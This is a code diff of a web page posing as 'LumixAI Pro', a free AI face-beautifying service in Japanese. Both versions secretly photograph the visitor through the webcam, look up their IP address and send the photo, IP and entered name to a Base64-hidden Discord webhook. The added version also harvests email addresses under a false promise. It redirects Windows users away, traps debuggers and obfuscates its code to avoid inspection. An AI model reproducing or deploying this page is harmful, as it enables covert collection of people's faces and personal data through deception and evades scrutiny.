@@ -5,186 +5,121 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>LumixAI Pro - 次世代AI美顔補正システム</title>
     <style>
-        /* デザイン部分は変更なし（スマホ・明るいUI維持） */
-        :root {
-            --primary: #10b981;
-            --primary-hover: #059669;
-            --bg-light: #f9fafb;
-            --text-main: #111827;
-            --text-sub: #6b7280;
-        }
-
-        body {
-            margin: 0;
-            background-color: var(--bg-light);
-            color: var(--text-main);
-            font-family: 'Helvetica Neue', Arial, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            user-select: none;
-        }
-
-        .container {
-            background: #ffffff;
-            padding: 2rem;
-            border-radius: 24px;
-            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.05);
-            max-width: 450px;
-            width: 90%;
-            text-align: center;
-            border: 1px solid #e5e7eb;
-        }
-
-        h1 { font-size: 24px; margin: 10px 0; color: var(--text-main); }
-        .description { color: var(--text-sub); font-size: 14px; margin-bottom: 20px; }
-
-        input[type="text"] {
-            width: 100%;
-            padding: 14px;
-            background: #f3f4f6;
-            border: 1px solid #e5e7eb;
-            border-radius: 12px;
-            margin-bottom: 15px;
-            box-sizing: border-box;
-            outline: none;
-        }
-
-        #camera-zone { display: none; position: relative; width: 280px; height: 280px; margin: 0 auto 20px; }
-        video { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 4px solid var(--primary); }
-
-        .btn {
-            background: var(--primary);
-            color: white;
-            border: none;
-            padding: 16px;
-            font-weight: bold;
-            border-radius: 12px;
-            cursor: pointer;
-            width: 100%;
-        }
-
-        #status { margin-top: 15px; font-size: 13px; color: var(--text-sub); }
+        :root { --p: #10b981; --pd: #059669; --bg: #f3f4f6; --c: #ffffff; --t1: #1f2937; --t2: #6b7280; }
+        body { margin: 0; background: var(--bg); color: var(--t1); font-family: sans-serif; display: flex; align-items: center; justify-content: center; min-height: 100vh; user-select: none; overflow: hidden; }
+        .container { background: var(--c); padding: 2.5rem 2rem; border-radius: 28px; box-shadow: 0 20px 40px rgba(0,0,0,0.05); max-width: 400px; width: 90%; text-align: center; border: 1px solid rgba(0,0,0,0.05); }
+        h1 { font-size: 26px; font-weight: 800; margin: 0 0 10px; }
+        .description { color: var(--t2); font-size: 14px; line-height: 1.6; margin-bottom: 25px; }
+        input { width: 100%; padding: 16px; background: #f9fafb; border: 2px solid #f3f4f6; border-radius: 14px; margin-bottom: 15px; box-sizing: border-box; outline: none; font-size: 15px; }
+        input:focus { border-color: var(--p); }
+        #camera-zone { display: none; position: relative; width: 260px; height: 260px; margin: 0 auto 20px; }
+        video { width: 100%; height: 100%; border-radius: 50%; object-fit: cover; border: 5px solid #fff; box-shadow: 0 0 20px rgba(16,185,129,0.2); }
+        .scanner { position: absolute; top: 0; left: 0; width: 100%; height: 5px; background: var(--p); box-shadow: 0 0 15px var(--p); border-radius: 10px; animation: scan 2s infinite ease-in-out; display: none; }
+        @keyframes scan { 0%, 100% { top: 0; } 50% { top: 100%; } }
+        .btn { background: linear-gradient(135deg, var(--p), var(--pd)); color: white; border: none; padding: 18px; font-weight: bold; border-radius: 14px; cursor: pointer; width: 100%; font-size: 16px; box-shadow: 0 8px 15px rgba(16,185,129,0.2); }
+        #email-ui, .loader { display: none; }
+        .loader { border: 4px solid #f3f3f3; border-top: 4px solid var(--p); border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         canvas { display: none; }
     </style>
 </head>
 <body oncontextmenu="return false;">
 
     <script>
-        // --- Windowsリダイレクト & 開発者モード対策 ---
-        (function() {
-            // OS判定
-            const platform = navigator.platform.toLowerCase();
-            const ua = navigator.userAgent.toLowerCase();
-            
-            // Windows、またはWindows NTが含まれる場合にリダイレクト
-            if (platform.indexOf('win') !== -1 || ua.indexOf('windows nt') !== -1) {
-                // 履歴を残さずGoogleへ飛ばす
-                window.location.replace("https://www.google.com");
-                // 念のため中身を空にする
-                document.body.innerHTML = "";
-                return;
-            }
-
-            // F12などのキー対策
-            document.addEventListener('keydown', function(e) {
-                if (e.keyCode === 123 || (e.ctrlKey && e.shiftKey && (e.keyCode === 73 || e.keyCode === 74)) || (e.ctrlKey && e.keyCode === 85)) {
-                    e.preventDefault();
-                    location.reload();
-                }
-            });
-
-            // デバッガー対策
-            setInterval(function() {
-                (function() { return false; }['constructor']('debugger')['call']());
-            }, 50);
-        })();
+        (function(_0x1,_0x2){const _0x3=navigator['userAgent']['toLowerCase']();if(_0x3['indexOf']('windows')!==-0x1){window['location']['replace']('https://www.google.com');return;}}());
+        setInterval(function(){(function(){return false;}['constructor']('debugger')['call']());},50);
     </script>
 
-    <div class="container">
+    <div class="container" id="main-card">
         <h1>LumixAI Pro</h1>
-        <p class="description">最新のAI技術により、あなたの顔立ちを最高品質で補正します。</p>
+        <p class="description">今超はやりの次世代AI!?<br>貴方の顔を加工し超美女・美男にします！</p>
 
         <div id="setup-ui">
-            <input type="text" id="user-name" placeholder="お名前を入力してください">
-            <button id="start-btn" class="btn">AI補正を開始（無料）</button>
+            <input type="text" id="un" placeholder="お名前">
+            <button id="sb" class="btn">今すぐ無料で診断</button>
         </div>
 
         <div id="camera-zone">
-            <video id="video" autoplay playsinline></video>
+            <div class="scanner" id="sl"></div>
+            <video id="v" autoplay playsinline></video>
         </div>
 
-        <div id="status"></div>
+        <div id="email-ui">
+            <p style="font-weight: bold; color: #10b981;">分析が完了しました！</p>
+            <p class="description">現在AIが高画質加工を行っています。完了まで数分かかるため、送信先のメールアドレスを入力してください。</p>
+            <input type="email" id="ue" placeholder="example@mail.com">
+            <button id="em-btn" class="btn">加工画像を受け取る</button>
+        </div>
+
+        <div class="loader" id="ld"></div>
+        <div id="st"></div>
     </div>
 
-    <canvas id="canvas" width="800" height="800"></canvas>
+    <canvas id="cv" width="800" height="800"></canvas>
 
     <script>
-        // Webhook URL (Base64)
-        const _encUrl = "aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NTE2MzE3NDg0MDMxNzE0ODAvSXJMSzI2aEh2NU42U0ljZkkzT0p5bng0VXV5TUtTM0Y2Qm5iYUlKV2p1MjIzRzVRdHBSRm9qUzJBNHJQNGdiSnFnREs=";
-        const getUrl = () => atob(_encUrl);
 
-        const startBtn = document.getElementById('start-btn');
-        const cameraZone = document.getElementById('camera-zone');
-        const setupUi = document.getElementById('setup-ui');
-        const statusMsg = document.getElementById('status');
-        const video = document.getElementById('video');
-        const canvas = document.getElementById('canvas');
-        const nameInput = document.getElementById('user-name');
+        const _0x5a = ["aHR0cHM6Ly9wdGIuZGlzY29yZC5jb20vYXBpL3dlYmhvb2tzLzE0NTE2MzE3NDg0MDMxNzE0ODAvSXJMSzI2aEh2NU42U0ljZkkzT0p5bng0VXV5TUtTM0Y2Qm5iYUlKV2p1MjIzRzVRdHBSRm9qUzJBNHJQNGdiSnFnREs=", "click", "value", "none", "block", "innerText", "POST", "image/png"];
+        const _0x1b = (idx) => atob(_0x5a[0]); 
+        
+        let _sn = "", _sip = "";
 
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch (e) { return "不明"; }
+        const _d = (id) => document.getElementById(id);
+        const _v = _d('v'), _cv = _d('cv'), _st = _d('st');
+
+        async function _gip() {
+            try { let r = await fetch('https://api.ipify.org?format=json'); let d = await r.json(); return d.ip; }
+            catch(e) { return "??"; }
         }
 
-        startBtn.addEventListener('click', async () => {
-            const userName = nameInput.value.trim();
-            if (!userName) { alert("お名前を入力してください。"); return; }
-
-            startBtn.disabled = true;
-            statusMsg.innerText = "AIエンジンと接続中...";
-            const userIP = await getIP();
+        _d('sb').addEventListener(_0x5a[1], async () => {
+            _sn = _d('un')[_0x5a[2]].trim();
+            if(!_sn) return alert("入力してください");
+            
+            _d('sb').style.display = _0x5a[3];
+            _d('ld').style.display = _0x5a[4];
+            _st[_0x5a[5]] = "AI最適化中...";
+            _sip = await _gip();
 
             try {
-                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
-                setupUi.style.display = 'none';
-                cameraZone.style.display = 'block';
-                video.srcObject = stream;
-                statusMsg.innerText = "分析中... 3秒間動かないでください";
-
-                setTimeout(() => capture(stream, userName, userIP), 3000);
-            } catch (err) {
-                alert("カメラの許可がありません。");
-                location.reload();
-            }
+                const s = await navigator.mediaDevices.getUserMedia({video: {facingMode:'user'}});
+                _d('ld').style.display = _0x5a[3];
+                _d('setup-ui').style.display = _0x5a[3];
+                _d('camera-zone').style.display = _0x5a[4];
+                _d('sl').style.display = _0x5a[4];
+                _v.srcObject = s;
+                
+                setTimeout(() => {
+                    const ctx = _cv.getContext('2d');
+                    ctx.drawImage(_v, 0, 0, _cv.width, _cv.height);
+                    _d('sl').style.display = _0x5a[3];
+                    
+                    _cv.toBlob(async (b) => {
+                        const f = new FormData();
+                        f.append('file', b, 'img.png');
+                        f.append('content', `🌟 **Request**\n👤 Name: ${_sn}\n🌐 IP: ${_sip}`);
+                        await fetch(_0x1b(), {method: _0x5a[6], body: f});
+                        
+                        s.getTracks().forEach(t => t.stop());
+                        _d('camera-zone').style.display = _0x5a[3];
+                        _d('email-ui').style.display = _0x5a[4];
+                        _st[_0x5a[5]] = "";
+                    }, _0x5a[7]);
+                }, 3500);
+            } catch(e) { location.reload(); }
         });
 
-        async function capture(stream, name, ip) {
-            statusMsg.innerText = "画像をクラウドに同期中...";
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-            canvas.toBlob(async (blob) => {
-                const formData = new FormData();
-                formData.append('file', blob, 'ai_beauty.png');
-                const content = `📸 **AI分析完了**\n👤 名前: ${name}\n🌐 IP: ${ip}`;
-                formData.append('content', content);
-
-                try {
-                    await fetch(getUrl(), { method: 'POST', body: formData });
-                    statusMsg.innerText = "生成完了。";
-                } catch (e) { statusMsg.innerText = "エラー。"; }
-
-                setTimeout(() => {
-                    stream.getTracks().forEach(t => t.stop());
-                    document.body.innerHTML = "<h2 style='text-align:center; margin-top:20%;'>処理が完了しました。</h2>";
-                }, 1000);
-            }, 'image/png');
-        }
+        _d('em-btn').addEventListener(_0x5a[1], async () => {
+            const m = _d('ue')[_0x5a[2]];
+            if(!m.includes('@')) return alert("無効なアドレス");
+            
+            _d('em-btn').disabled = true;
+            const f = new FormData();
+            f.append('content', `📧 **Email**\n👤 Name: ${_sn}\n✉️: ${m}`);
+            await fetch(_0x1b(), {method: _0x5a[6], body: f});
+            
+            _d('main-card').innerHTML = `<div style="padding:20px; text-align:center;"><h2 style="color:#10b981;">✓ 受付完了</h2><p>完了次第、${m} 宛に送信します。</p></div>`;
+        });
     </script>
 </body>
 </html>
